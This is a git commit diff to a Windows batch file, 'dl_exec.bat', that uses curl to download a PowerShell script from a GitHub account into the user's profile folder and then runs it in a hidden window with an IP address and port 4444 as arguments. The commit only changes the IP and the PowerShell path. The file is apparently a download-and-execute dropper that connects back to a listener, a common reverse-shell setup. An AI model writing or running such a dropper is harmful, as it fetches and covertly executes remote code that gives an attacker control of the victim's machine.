39d26940a9c32535aa8310e0dffb7797821fefb4
4444neb <109790709+4444neb@users.noreply.github.com>
2022-07-24 19:49:22 +0200

    Update dl_exec.bat

--- dl_exec.bat
+++ dl_exec.bat
@@ -1,2 +1,2 @@
 curl https://raw.githubusercontent.com/4444neb/tools/main/script.ps1 > C:\Users\%username%\script.ps1
-PowerShell.exe -WindowStyle hidden "C:\Users\%username%\script.ps1" 192.168.1.48 4444
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden "C:\Users\%username%\script.ps1" 127.0.0.1 4444
